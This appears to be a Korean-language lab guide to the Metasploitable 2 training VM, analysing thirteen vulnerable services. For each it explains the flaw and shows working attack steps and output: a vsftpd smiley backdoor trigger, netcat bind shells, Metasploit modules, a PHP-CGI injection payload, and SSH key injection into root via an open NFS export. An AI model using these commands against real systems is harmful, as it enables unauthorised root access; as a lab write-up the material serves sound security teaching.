Metasploitable 2 취약점 분석

의도적으로 취약하게 설계된 리눅스 서버 환경인 Metasploitable 2를 대상으로 한 시스템 보안 진단 및 취약점 분석 실무 가이드입니다. 본 문서는 각 서비스별 결함의 원인을 규명하고 실제 침투 사례를 통해 보안 위협을 증명하는 과정을 담고 있습니다.

0. 분석 대상 시스템 정보

시스템 사양

운영체제Ubuntu 8.04.4 LTS (Hardy Heron)
커널 버전2.6.24-16-server (x86)
기본 쉘/bin/sh (dash)
관리자 계정msfadmin (UID 1000) / Password: msfadmin

분석 요점

Metasploitable 2는 현대적 보안 패치가 적용되지 않은 레거시 서비스들의 결합체입니다. 주요 분석 포인트는 소스코드 레벨의 백도어(Backdoor), 부적절한 서비스 설정(Misconfiguration), 그리고 관리되지 않은 기본 인증 정보(Default Credentials)입니다.
#01

Port 21: vsftpd 2.3.4 Backdoor

Critical

결함 원인 분석

vsftpd 2.3.4 소스코드 배포 과정에서 비공식적으로 삽입된 백도어입니다. 사용자가 USER 명령어로 전달하는 문자열의 끝에 스마일리 기호인 :) 문자가 포함되어 있을 경우, 조건문이 실행되어 시스템의 6200번 포트에 루트 권한의 바인드 쉘(Bind Shell)이 생성됩니다.

Analysis Procedure

1단계: 백도어 활성화 트리거

# 대상 서버의 FTP 서비스 접속
$ telnet 192.168.10.5 21
Connected to 192.168.10.5.
220 (vsFTPd 2.3.4)
USER anonymous:)
331 Please specify the password.
PASS password
# 활성화 시 커서가 멈추거나 로그인이 지연됨

2단계: 원격 쉘 획득

# 생성된 6200번 포트에 Netcat으로 접속
$ nc -nv 192.168.10.5 6200
Connection to 192.168.10.5 6200 port succeeded!
id
uid=0(root) gid=0(root)
#02

Port 6667: UnrealIRCd Backdoor

Critical

결함 원인 분석

UnrealIRCd 3.2.8.1 버전의 특정 빌드에 포함된 백도어입니다. IRC 서버에 AB;로 시작하는 메시지를 전송하면, 해당 메시지의 이후 문자열을 시스템 명령어로 해석하여 system() 함수를 통해 실행하는 취약점입니다.

# Metasploit Framework를 이용한 자동화 검증
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unreal_ircd_3281_backdoor) > set RHOSTS 192.168.10.5
msf6 exploit(unreal_ircd_3281_backdoor) > exploit

[*] 192.168.10.5:6667 - Connected to 192.168.10.5:6667...
[*] 192.168.10.5:6667 - Sending backdoor command...
[*] Command shell session 1 opened
#03

Port 3632: distcc Daemon RCE

High

결함 원인 분석

분산 컴파일 도구인 distcc의 설계상 인증 결함입니다. 클라이언트로부터 수신한 컴파일 작업을 수행할 때, 전달된 인자값을 적절히 필터링하지 않아 컴파일 옵션 대신 임의의 쉘 명령어를 실행할 수 있습니다.

# Nmap 스크립트를 통한 실질적 위협 확인
$ nmap -p 3632 192.168.10.5 --script distcc-exec --script-args="distcc-exec.cmd='id'"

PORT STATE SERVICE
3632/tcp open distcc
| distcc-exec:
| VULNERABLE: distcc Daemon Remote Code Execution
| Result: uid=36(daemon) gid=1(bin)
#04

Port 1524: Ingreslock Bind Shell

Instant Root

결함 원인 분석

고전적인 유닉스 시스템의 Ingres 데이터베이스 서비스 포트이나, 이 서버에서는 어떠한 인증 과정도 거치지 않고 연결 즉시 루트 쉘을 반환하도록 설정된 의도적 백도어입니다.

# 포트 접속 시 즉시 쉘 인터페이스 활성화
$ nc -nv 192.168.10.5 1524
Connection to 192.168.10.5 1524 port succeeded!
root@metasploitable:/#
#05

Port 445: Samba "usermap_script" RCE

High

결함 원인 분석

Samba 3.0.20~3.0.25rc3 버전에서 발생하는 원격 코드 실행 취약점입니다. smb.conf 내의 username map script 옵션을 처리할 때, 사용자 이름 필드에 포함된 쉘 메타문자가 적절히 이스케이프되지 않아 발생하는 결함입니다.

msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 192.168.10.5
msf6 exploit(usermap_script) > exploit

[*] Command shell session 1 opened (root)
#06

Port 2049: NFS (Network File System)

High

결함 원인 분석

NFS의 공유 설정 파일인 /etc/exports에서 루트 디렉토리(/)가 접근 제한 없이(*) 공유되도록 설정되어 있습니다. 이로 인해 임의의 호스트가 대상 시스템의 전체 파일 시스템을 마운트하여 기밀 정보를 유출하거나 조작할 수 있습니다.

# 1. 공유 디렉토리 리스트 정보 수집
$ showmount -e 192.168.10.5
/ * (everyone)

# 2. 로컬 시스템에 마운트 수행
$ sudo mkdir /mnt/victim_nfs
$ sudo mount -t nfs 192.168.10.5:/ /mnt/victim_nfs

# 3. 침투 확인 (root 계정의 SSH 공용키 주입)
$ sudo cat ~/.ssh/id_rsa.pub >> /mnt/victim_nfs/root/.ssh/authorized_keys
#07

Port 512-514: R-Services 신뢰 관계 결함

High

결함 원인 분석

rlogin, rsh와 같은 서비스에서 사용하는 신뢰 설정 파일인 .rhosts에 + + 기호가 포함되어 있습니다. 이는 모든 IP 주소와 모든 사용자의 접근을 인증 없이 신뢰하겠다는 의미로, 치명적인 보안 허점입니다.

# 별도의 자격 증명 없이 원격 시스템 쉘 획득
$ rlogin -l root 192.168.10.5
root@metasploitable:~# # 즉시 로그인됨
#08

Port 25: SMTP User Enumeration

Medium

분석 개요

SMTP 서버가 VRFY 명령을 허용하도록 구성되어 있습니다. 이 명령은 전달된 사용자명이 시스템 내에 존재하는지 여부를 확인해 주는데, 공격자는 이를 무차별 대입(Brute Force) 기법과 결합하여 서버에 존재하는 계정 목록을 대량으로 수집할 수 있습니다.

# 수동 검증 프로세스
$ telnet 192.168.10.5 25
VRFY root
252 2.0.0 root
VRFY invalid_user
550 5.1.1 User unknown
#09

Port 53: DNS Zone Transfer

Medium

분석 개요

DNS 서버(BIND)의 영역 전송(Zone Transfer) 제한 설정이 미흡하여 외부로부터의 AXFR 요청을 수락합니다. 이를 통해 네트워크 내부의 호스트 명명 규칙, IP 대역 등 인프라 전반의 정보를 탈취할 수 있습니다.

# 도메인 정보 전체 획득 시도
$ dig axfr @192.168.10.5 metasploitable.local
; metasploitable.local. IN A 192.168.10.5
; www.metasploitable.local. IN A 192.168.10.5
#10

Port 3306/5432: DB Authentication Failure

Medium

결함 원인 분석

MySQL과 PostgreSQL 데이터베이스 시스템이 외부 원격 접속을 허용하고 있으며, 관리자 계정(root, postgres)의 비밀번호가 설정되어 있지 않거나 기본값으로 방치되어 있습니다.

# MySQL 무인증 접속 테스트
$ mysql -u root -h 192.168.10.5

# PostgreSQL 기본 자격 증명(postgres/postgres) 테스트
$ psql -h 192.168.10.5 -U postgres
#11

Port 80: PHP CGI Argument Injection

High

결함 원인 분석 (CVE-2012-1823)

PHP-CGI의 인자 처리 과정에서 발생하는 인젝션 결함입니다. URL 쿼리 스트링의 특정 파라미터가 PHP 실행 파일의 명령줄 옵션(-d 등)으로 전달됨으로써, 원격에서 PHP 설정을 변경하고 임의 코드를 실행할 수 있게 됩니다.

# 원격 명령 실행 검증
$ curl -X POST "http://192.168.10.5/?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input" \
     --data "<?php system('id'); ?>"
uid=33(www-data) gid=33(www-data)
#12

Port 8180: Tomcat Manager Exploit

High

결함 원인 분석

Apache Tomcat의 관리자 웹 애플리케이션인 Manager App의 인증 정보가 tomcat / tomcat이라는 취약한 값으로 설정되어 있습니다. 인증 성공 후 제공되는 배포(Deploy) 기능을 이용해 원격 코드 실행이 가능한 WAR 파일을 업로드할 수 있습니다.

msf6 > use exploit/multi/http/tomcat_mgr_deploy
msf6 exploit(tomcat_mgr_deploy) > set HttpUsername tomcat
msf6 exploit(tomcat_mgr_deploy) > set HttpPassword tomcat
msf6 exploit(tomcat_mgr_deploy) > exploit
#13

Port 5900: VNC Remote Desktop Access

High

결함 원인 분석

VNC(Virtual Network Computing) 서비스의 비밀번호가 매우 단순한 password로 설정되어 있습니다. 공격자는 별도의 익스플로잇 없이도 인증 정보를 획득하여 시스템의 GUI 환경을 직접 장악할 수 있습니다.

# 원격 제어 도구를 이용한 접속
$ vncviewer 192.168.10.5
# 인증 창에서 'password' 입력 시 화면 동기화 성공
